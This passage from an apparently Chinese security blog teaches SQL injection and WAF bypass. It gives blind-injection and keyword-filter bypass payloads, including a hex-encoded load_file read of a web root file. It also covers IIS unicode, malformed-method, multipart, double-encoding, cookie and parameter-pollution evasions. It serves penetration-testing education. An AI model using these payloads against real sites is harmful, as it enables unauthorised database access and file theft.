class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">实例:</span><br><span class="line">+----+-------------+</span><br><span class="line">| id | name        |</span><br><span class="line">+----+-------------+</span><br><span class="line">|  1 | langyi      |</span><br><span class="line">|  2 | luyasheng   |</span><br><span class="line">|  3 | lichongfei  |</span><br><span class="line">|  4 | xiaoming    |</span><br><span class="line">|  5 | 0           |</span><br><span class="line">|  6 | liumuzi     |</span><br><span class="line">|  7 | wangyuxing  |</span><br><span class="line">|  8 | gaoyingying |</span><br><span class="line">| 10 | pass        |</span><br><span class="line">| 11 | 0           |</span><br><span class="line">| 12 | bbbx        |</span><br><span class="line">| 13 | 0           |</span><br><span class="line">+----+-------------+</span><br><span class="line"></span><br><span class="line">1.百分号:</span><br><span class="line">select * from math1 where name like &#x27;l%&#x27; limit 1 offset 0;</span><br><span class="line">select * from math1 where id like concat(char(49),char(95));    #49=1，95=_</span><br><span class="line">MariaDB [myclass]&gt; select * from math1 where name like &#x27;l%&#x27;;</span><br><span class="line">+----+-------------+</span><br><span class="line">| id | name        |</span><br><span class="line">+----+-------------+</span><br><span class="line">|  1 | lxxxxxxxx   |</span><br><span class="line">|  2 | luyasheng   |</span><br><span class="line">|  3 | lichongfei  |</span><br><span class="line">|  6 | liumuzi     |</span><br><span class="line">| 12 | liushuqiang |</span><br><span class="line">+----+-------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">2.下划线:</span><br><span class="line">select * from math1 where id like &#x27;1_&#x27;;</span><br><span class="line">MariaDB [myclass]&gt; select * from math1 where id like &#x27;1_&#x27;;</span><br><span class="line">+----+--------------+</span><br><span class="line">| id | name         |</span><br><span class="line">+----+--------------+</span><br><span class="line">| 10 | pass         |</span><br><span class="line">| 11 | huangjingtao |</span><br><span class="line">| 12 | liushuqiang  |</span><br><span class="line">| 13 | ctfer        |</span><br><span class="line">+----+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.句号:</span><br><span class="line">select user from mysql.user;</span><br><span class="line">MariaDB [myclass]&gt; select name from myclass.math1;</span><br><span class="line">+--------------+</span><br><span class="line">| name         |</span><br><span class="line">+--------------+</span><br><span class="line">| lxxxxxxxx    |</span><br><span class="line">| luyasheng    |</span><br><span class="line">| lichongfei   |</span><br><span class="line">| xiaoming     |</span><br><span class="line">| huxingyue    |</span><br><span class="line">| liumuzi      |</span><br><span class="line">| wangyuxing   |</span><br><span class="line">| gaoyingying  |</span><br><span class="line">| pass         |</span><br><span class="line">| huangjingtao |</span><br><span class="line">| liushuqiang  |</span><br><span class="line">| ctfer        |</span><br><span class="line">+--------------+</span><br><span class="line">12 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">通用:</span><br><span class="line">select @@LOCAL.SQL_SELECT_LIMIT;</span><br><span class="line">select @@GLOBAL.VERSION;</span><br><span class="line">select CURRENT_USER();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="不安全函数绕过："><a href="#不安全函数绕过：" class="headerlink" title="不安全函数绕过："></a>不安全函数绕过：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1.parse_url()</span><br><span class="line">功能说明:</span><br><span class="line">解析 URL，返回其组成部分</span><br><span class="line"></span><br><span class="line">绕过:</span><br><span class="line">获取URL的参数有一点儿问题，他并不能很好的处理，如果我们传入的是</span><br><span class="line">///upload.php?cache这样的地址，然后parse_url()处理URL会返回false，那么后面的preg_match就不会匹配到任何字符串了。</span><br><span class="line"></span><br><span class="line">2.htmlentities()</span><br><span class="line">功能说明:</span><br><span class="line">将字符转换为 HTML 转义字符</span><br><span class="line"></span><br><span class="line">绕过:</span><br><span class="line">只过滤单引号，双引号等，不过滤反斜杠 \ ，可以反斜杠 \ 转义绕过</span><br><span class="line"></span><br><span class="line">3.substr_count()</span><br><span class="line">功能说明:</span><br><span class="line">计算字串出现的次数</span><br><span class="line"></span><br><span class="line">绕过:</span><br><span class="line">使用%00</span><br><span class="line">unio%00n</span><br><span class="line"></span><br><span class="line">4.stripslashes()</span><br><span class="line">功能说明:</span><br><span class="line">去掉一个反斜杠 \</span><br><span class="line"></span><br><span class="line">5.mysql_real_escape_string()</span><br><span class="line">功能说明:</span><br><span class="line">转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集 </span><br><span class="line"></span><br><span class="line">6.is_numeric()</span><br><span class="line">功能说明:</span><br><span class="line">检测变量是否为数字或数字字符串</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="通用WAF绕过："><a href="#通用WAF绕过：" class="headerlink" title="通用WAF绕过："></a>通用WAF绕过：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">可以绕过(,,union,select,and,or,空格,#，balabalabalabala)</span><br><span class="line">a&#x27;^!(mid((version)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;^(ascii(mid((version())from(1)))=53)^&#x27;1</span><br><span class="line">select&#123;x table_name&#125;from&#123;x information_schema.tables&#125;;</span><br><span class="line"></span><br><span class="line">if(substr(user(),1,1)in(0x41),3,0)  #id=3和id=0返回页面不同</span><br><span class="line">if(substr(version(),1,1)in(0x35),&#x27;1&#x27;,9) #注意&#x27;1&#x27;和1</span><br><span class="line"></span><br><span class="line">id=6^(if(ascii(mid(load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870),1,2))&gt;1,0,1))</span><br><span class="line"></span><br><span class="line">十六进制编码:</span><br><span class="line">0x2F7661722F7777772F68746D6C2F696E6465782E706870</span><br><span class="line">/var/www/html/index.php</span><br></pre></td></tr></table></figure>
<h3 id="关键字过滤绕过："><a href="#关键字过滤绕过：" class="headerlink" title="关键字过滤绕过："></a>关键字过滤绕过：</h3><ul>
<li>左边表示会被Filtered的语句，右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字</li>
</ul>
<table>
<thead>
<tr>
<th>原语句</th>
<th>绕过语句</th>
</tr>
</thead>
<tbody><tr>
<td><font color=#FF6347>and</font></td>
<td><font color=#00BFFF>&amp;&amp;</font></td>
</tr>
<tr>
<td><font color=#FF6347>or</font></td>
<td><font color=#00BFFF>||</font></td>
</tr>
<tr>
<td><font color=#FF6347>union</font> select user, password from users</td>
<td><font color=#00BFFF>1 ||</font> (select user from users where user_id &#x3D; 1) &#x3D; ‘admin</td>
</tr>
<tr>
<td>1 || (select user from users <font color=#FF6347>where</font> user_id &#x3D; 1) &#x3D; ‘admin’</td>
<td>1 || (select user from users <font color=#00BFFF>limit</font> 1) &#x3D; ‘admin</td>
</tr>
<tr>
<td>1 || (select user from users <font color=#FF6347>limit</font> 1) &#x3D; ‘admin’</td>
<td>1 || (select user from users <font color=#00BFFF>group by</font> user_id having user_id &#x3D; 1) &#x3D; ‘admin’</td>
</tr>
<tr>
<td>1 || (select user from users <font color=#FF6347>group by</font> user_id having user_id &#x3D; 1) &#x3D; ‘admin’</td>
<td>1 || (select substr(<font color=#00BFFF>group_concat</font>(user_id),1,1) user from users )&#x3D;1</td>
</tr>
<tr>
<td>1  || (<font color=#FF6347>select</font> substr(group_concat(user_id),1,1) user from users) &#x3D; 1</td>
<td>1 || 1 &#x3D; 1 into outfile ‘result.txt’　或者  1 || substr(user,1,1) &#x3D; ‘a’</td>
</tr>
<tr>
<td>1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</td>
<td>1 || user_id is not null 或者 1 || substr(user,1,1) &#x3D; 0x61 或者 1 || substr(user,1,1) &#x3D; unhex(61)　　&#x2F;&#x2F;　‘ Filtered</td>
</tr>
<tr>
<td>1 || substr(user,1,1) &#x3D; un<font color=#FF6347>hex</font>(61)</td>
<td>1 || substr(user,1,1) &#x3D; lower(<font color=#00BFFF>conv(11,10,36)</font>)</td>
</tr>
<tr>
<td>1 || <font color=#FF6347>substr</font>(user,1,1) &#x3D; lower(conv(11,10,36))</td>
<td>1 || <font color=#00BFFF>lpad</font>(user,7,1)</td>
</tr>
<tr>
<td>1 || lpad(user,7,1)</td>
<td>1%0b||%0blpad(user,7,1)　　&#x2F;&#x2F; ‘ ‘ Filtered</td>
</tr>
</tbody></table>
<h3 id="高级WAF绕过技术："><a href="#高级WAF绕过技术：" class="headerlink" title="高级WAF绕过技术："></a>高级WAF绕过技术：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">分类：</span><br><span class="line">1.云waf；[阿里云盾，百度云加速，360网站卫士，加速乐等]</span><br><span class="line">2.传统安全厂商的硬件waf以及一直存在的ips，ids设备；[绿盟，启明，深信服，安恒等]</span><br><span class="line">3.主机防护软件如安全狗，云锁；</span><br><span class="line">4.软waf如modsecurity，nginx-lua-waf等。</span><br></pre></td></tr></table></figure>
<h3 id="WAF在哪里"><a href="#WAF在哪里" class="headerlink" title="WAF在哪里:"></a>WAF在哪里:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我就用&#x27;WAF&#x27;来代替上面所说的一些防护软件，我们需要知道这些WAF都在网络空间的哪些位置。</span><br><span class="line">用户从浏览器发出一个请求（http://www.miku.com/1.php?id=1%20and1=1）到最终请求转发到服务器上，中间经历了多少设备，这些工作在网络的第几层（TCP/IP协议）？我们应用层的数据被哪些设备处理了？</span><br><span class="line">这是一个经典的数通问题，了解WAF在网络空间的位置，我们便可以更清楚的知道使用哪些知识来协助我们进行WAF bypass。</span><br></pre></td></tr></table></figure>
<ul>
<li>如下图所示:<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173148997.png" alt="image-20251217173148997"></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">画了一个简单的拓扑图。</span><br><span class="line">图中可以很清楚的看到，我们的云waf，硬件ips/ids防护，硬件waf，主机防护，软waf以及应用程序所在的位置。</span><br></pre></td></tr></table></figure>
<h3 id="WAF数据处理"><a href="#WAF数据处理" class="headerlink" title="WAF数据处理:"></a>WAF数据处理:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在明白了各种防护软件在网络环境下的拓扑之后，现在了解一下基础数据的流量与相关设备的基本处理。</span><br><span class="line"></span><br><span class="line">假设客户端访问url：http://www.miku.com/1.php?id=1&#x27;and&#x27;1&#x27;=&#x27;1，该请求请求的数据是服务器上数据库中id为1的记录。</span><br></pre></td></tr></table></figure>
<ul>
<li>假设这台服务器使用了相关云waf。</li>
</ul>
<ol>
<li><p>一个完整的过程，首先会请求DNS，由于配置云waf的时候，会修改DNS的解析。我们发送DNS请求之后，域名会被解析到云WAF的ip上去。DNS解析完成之后，获取到域名信息，然后进入下一个步骤。</p>
</li>
<li><p>HTTP协议是应用层协议，且是tcp协议，因此会首先去做TCP的三次握手，此处不去抠三次握手的细节，假设三次握手建立完毕。</p>
</li>
<li><p>发送HTTP请求过去，请求会依次经过云WAF，硬件IPS&#x2F;IDS设备，硬件WAF设备，服务器，web服务器，主机防护软件&#x2F;软WAF，WEB程序，数据库。 云WAF，硬件IPS&#x2F;IDS，硬件WAF均有自己处理数据的方式。云WAF与硬件WAF细节上不太清楚，对于硬件IPS有一定的了解。之前在drops上发过一篇文章，文章链接是：<a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/4323%E3%80%82">http://drops.wooyun.org/papers/4323。</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在获取HTTP数据之前会做TCP重组，重组主要目的是针对互联网数据包在网络上传输的时候会出现乱序的情况，数据包被重组之后就会做协议解析，取出相关的值。如http_method=GET,http_payload=xxx等等。这些值就对应了IPS规则中相关规则的值。从而来判断规则匹配与不匹配。</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="WAF-BYPASS的理解"><a href="#WAF-BYPASS的理解" class="headerlink" title="WAF BYPASS的理解:"></a>WAF BYPASS的理解:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在我自己看来，所谓的BYPASS WAF实际上是去寻找位于WAF设备之后处理应用层数据包的硬件/软件的特性。利用特性构造WAF不能命中，但是在应用程序能够执行成功的载荷，绕过防护。</span><br><span class="line"></span><br><span class="line">那些特性就像是一个个特定的场景一样，一些是已经被研究人员发现的，一些是还没被发现，等待被研究人员发现的。当我们的程序满足了这一个个的场景，倘若WAF没有考虑到这些场景，我们就可以利用这些特性bypass掉WAF了。</span><br></pre></td></tr></table></figure>
<ul>
<li>例如我们现在需要bypass一个云WAF&#x2F;IPS&#x2F;硬件WAF，此处我们可以利用的点就是：</li>
</ul>
<ol>
<li>Web服务器层bypass</li>
<li>Web应用程序层bypass</li>
<li>数据库层 bypass</li>
<li>WAF层bypass<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于各个层面可以利用的特性很多，而且WAF往往要考虑自身的性能等等方面，导致了WAF往往会留下一些软肋。下面的文章来细细的总结下之前那些经常被用来做bypass的特性。</span><br><span class="line"></span><br><span class="line">Ps.思路是不是稍微清晰了一点。= =</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Bypass-WAF-姿势"><a href="#Bypass-WAF-姿势" class="headerlink" title="Bypass WAF 姿势:"></a>Bypass WAF 姿势:</h3><h4 id="通过真实ip-bypass"><a href="#通过真实ip-bypass" class="headerlink" title="通过真实ip bypass:"></a>通过真实ip bypass:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">思路:</span><br><span class="line">通过服务端发送邮件，查看原文件，获取真实Ip，然后通过修改host，域名解析到真实Ip,绕过cdn云waf</span><br><span class="line">https://www.t00ls.net/thread-42975-1-1.html</span><br><span class="line">https://www.t00ls.net/viewthread.php?tid=34467&amp;highlight=%E7%9C%9F%E5%AE%9Eip</span><br></pre></td></tr></table></figure>
<h4 id="Web-Server层-bypass"><a href="#Web-Server层-bypass" class="headerlink" title="Web Server层 bypass:"></a>Web Server层 bypass:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用WEB服务器的特性来进行WAF bypass，常见的组合就有asp+IIS aspx+IIS php+apache java+tomcat等。</span><br><span class="line"></span><br><span class="line">这部分内容大多是用来做http的解析等相关事务的，因此这里我理解的也就是寻找WAF对于http解析以及真实环境对于http解析的差异特性，利用差异特性来bypass WAF。</span><br><span class="line"></span><br><span class="line">Ps.这部分待挖掘的地方还有很多，而且这部分挖掘出来的特性应该对于WAF的bypass是致命的。</span><br></pre></td></tr></table></figure>
<h5 id="IIS服务器"><a href="#IIS服务器" class="headerlink" title="IIS服务器"></a>IIS服务器</h5><h6 id="特性"><a href="#特性" class="headerlink" title="%特性"></a>%特性</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在asp+iis的环境中存在一个特性，就是特殊符号%，在该环境下当们我输入s%elect的时候，在WAF层可能解析出来的结果就是s%elect，但是在iis+asp的环境的时候，解析出来的结果为select。</span><br><span class="line"></span><br><span class="line">本地搭建asp+iis环境测试</span><br></pre></td></tr></table></figure>
<ul>
<li>测试效果如下图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173334542.png" alt="image-20251217173334542"></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ps.此处猜测可能是iis下asp.dll解析时候的问题，aspx+iis的环境就没有这个特性。</span><br></pre></td></tr></table></figure>
<h6 id="u特性"><a href="#u特性" class="headerlink" title="%u特性"></a>%u特性</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Iis服务器支持对于unicode的解析，例如我们对于select中的字符进行unicode编码，可以得到如下的s%u006c%u0006ect，这种字符在IIS接收到之后会被转换为select，但是对于WAF层，可能接收到的内容还是s%u006c%u0006ect，这样就会形成bypass的可能。我们搭建asp+iis和aspx+iis的环境：</span><br></pre></td></tr></table></figure>
<ol>
<li>asp+iis的环境测试效果如图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173410805.png" alt="image-20251217173410805"></li>
<li>aspx+iis的环境测试效果如图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173457310.png" alt="image-20251217173457310"></li>
</ol>
<h6 id="另类-u特性"><a href="#另类-u特性" class="headerlink" title="另类%u特性"></a>另类%u特性</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Ps.需要注意的是，这个特性测试的时候发现aspx+iis的环境是不支持的，有待做实验考证，怀疑是后缀后面的内容是通过asp.net isapi来出来的，导致了asp和aspx的不同。</span><br><span class="line"></span><br><span class="line">上面写到了iis支持unicode的格式的解析。这种iis解析，存在一个特性，之前在wooyun上报过一个漏洞： WooYun: 一个有意思的通用windows防火墙bypass(云锁为例) 。</span><br><span class="line"></span><br><span class="line">该漏洞主要利用的是unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现： 多个widechar会有可能转换为同一个字符。</span><br><span class="line"></span><br><span class="line">打个比方就是譬如select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e。</span><br><span class="line"></span><br><span class="line">s%u0065lect-&gt;select</span><br><span class="line">s%u00f0lect-&gt;select</span><br><span class="line"></span><br><span class="line">WAF层可能能识别s%u0065lect的形式，但是很有可能识别不了s%u00f0lect的形式。这样就可以利用起来做WAF的绕过。</span><br></pre></td></tr></table></figure>
<ul>
<li>asp+iis的环境测试效果如图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173544464.png" alt="image-20251217173544464"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ps.该漏洞的利用场景可能有局限性，但是挖掘思路是可以借鉴的。</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="apache服务器"><a href="#apache服务器" class="headerlink" title="apache服务器"></a>apache服务器</h5><h6 id="畸形method"><a href="#畸形method" class="headerlink" title="畸形method"></a>畸形method</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容，如请求为的method为DOTA2，依然返回了aid为2的结果。</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-apache-test.jpg" alt="php-apache-test"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果某些WAF在处理数据的时候严格按照GET,POST等方式来获取数据，就会因为apache的宽松的请求方式导致bypass。 实例： WooYun: 安全宝SQL注入规则绕过</span><br><span class="line"></span><br><span class="line">ps.测试的时候使用了apache2.4.7的版本。</span><br></pre></td></tr></table></figure>
<h6 id="php-apache畸形的boundary"><a href="#php-apache畸形的boundary" class="headerlink" title="php+apache畸形的boundary"></a>php+apache畸形的boundary</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为----aaaa,123456，php解析的时候只识别了----aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS。</span><br><span class="line"></span><br><span class="line">参考：http://blog.phdays.com/2014/07/review-of-waf-bypass-tasks.html</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-apache-test2.jpg" alt="php-apache-test2"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如上图，可能出现waf获取的是一个图片的内容，而在web端获取的是aid=2的值。这样的差别就有可能造成bypass。</span><br></pre></td></tr></table></figure>
<h5 id="nginx服务器"><a href="#nginx服务器" class="headerlink" title="nginx服务器"></a>nginx服务器</h5><h6 id="畸形method-1"><a href="#畸形method-1" class="headerlink" title="畸形method"></a>畸形method</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同apache，畸形method默认为GET方法</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-nginx-test.png" alt="php-nginx-test"></p>
<h6 id="post长数据，绕过ngx-lua-waf"><a href="#post长数据，绕过ngx-lua-waf" class="headerlink" title="post长数据，绕过ngx_lua_waf"></a>post长数据，绕过ngx_lua_waf</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">x=n个x&amp;id=payload</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-nginx-test2.png" alt="php-nginx-test2"></p>
<h4 id="Web应用程序层bypass"><a href="#Web应用程序层bypass" class="headerlink" title="Web应用程序层bypass"></a>Web应用程序层bypass</h4><h5 id="双重url编码"><a href="#双重url编码" class="headerlink" title="双重url编码"></a>双重url编码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">双重url编码，即对于浏览器发送的数据进行了两次urlencode操作，如s做一次url编码是%73,再进行一次编码是%25%37%33。一般情况下数据经过WAF设备的时候只会做一次url解码，这样解码之后的数据一般不会匹配到规则，达到了bypass的效果。</span><br><span class="line"></span><br><span class="line">个人理解双重url编码，要求数据在最后被程序执行之前，进行了两次url解码，如果只进行了一次解码，这样在最后的结果也是不会被正确执行的。 实例： WooYun: 腾讯某分站SQL注射-直接绕过WAF</span><br></pre></td></tr></table></figure>
<h5 id="请求获取方式"><a href="#请求获取方式" class="headerlink" title="请求获取方式"></a>请求获取方式</h5><ol>
<li>变换请求方式</li>
</ol>
<h6 id="GET-POST-COOKIE"><a href="#GET-POST-COOKIE" class="headerlink" title="GET,POST,COOKIE"></a>GET,POST,COOKIE</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在web环境下有时候会出现统一参数获取的情况，主要目的就是对于获取的参数进行统一过滤。例如我获取的参数t=select 1 from 2 这个参数可以从get参数中获取，可以从post参数获取，也可以从cookie参数中获取。</span><br><span class="line"></span><br><span class="line">典型的dedecms，在之前测试的时候就发现了有些waf厂商进行过滤的时候过滤了get和post，但是cookie没有过滤，直接更改cookie参数提交payload，即绕过。</span><br><span class="line"></span><br><span class="line">实例: WooYun: 百度云加速防御规则绕过之三 一个dedecms的站，get，post均过滤了，但是并没有过滤cookie参数。</span><br></pre></td></tr></table></figure>
<h6 id="urlencode和form-data"><a href="#urlencode和form-data" class="headerlink" title="urlencode和form-data"></a>urlencode和form-data</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试站点的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交。</span><br><span class="line"></span><br><span class="line">我们在阿里云ecs主机上搭建个环境，创建一个存在sql注入漏洞的页面，获取参数从POST上获取，首先我以urlencode的方式提交，查看发现提交的请求被阻断了。</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aiy-post-test.jpg" alt="aiy-post-test"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其次我们以form-data的方式提交，发现爆出了数据库的版本。</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aiy-post-test2.jpg" alt="aiy-post-test2"></p>
<ol start="2">
<li>畸形请求方式</li>
</ol>
<h6 id="asp-asp-net-request解析"><a href="#asp-asp-net-request解析" class="headerlink" title="asp&#x2F;asp.net request解析"></a>asp&#x2F;asp.net request解析</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在asp和asp.net中使用参数获取用户的提交的参数一般使用request包，譬如使用request[&#x27;&#x27;]来获取的时候可能就会出现问题。 资料文档：http://www.80sec.com/%E6%B5%85%E8%B0%88%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%95%B0%E7%A7%8D%E6%96%B9%E6%B3%95.html</span><br><span class="line"></span><br><span class="line">当使用request[&#x27;&#x27;]的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type。</span><br><span class="line"></span><br><span class="line">我们搭建一个实例：</span><br><span class="line"></span><br><span class="line">我们创建一个letmetest.aspx的界面获取用户提交的内容，并且将request[&#x27;t&#x27;]的内容打印出来。【在服务器上安装了安全狗】 首先我们提交正常的POST请求，发现已经被安全狗阻断了：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/dog-post-test.jpg" alt="dog-post-test"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时我们提交畸形的请求，method为GET，但是内容为POST的内容，发现打印出来了内容。</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/dog-post-test2.jpg" alt="dog-post-test2"></p>
<h5 id="hpp方式"><a href="#hpp方式" class="headerlink" title="hpp方式"></a>hpp方式</h5><table>
<thead>
<tr>
<th>Web服务器</th>
<th>参数获取函数</th>
<th>获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td>PHP&#x2F;Apache</td>
<td>$_GET(“par”)</td>
<td>Last</td>
</tr>
<tr>
<td>JSP&#x2F;Tomcat</td>
<td>Request.getParameter(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Perl(CGI)&#x2F;Apache</td>
<td>Param(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Python&#x2F;Apache</td>
<td>getvalue(“par”)</td>
<td>All</td>
</tr>
<tr>
<td>ASP&#x2F;IIS</td>
<td>Request.QueryString(“par”)</td>
<td>All</td>
</tr>
</tbody></table>
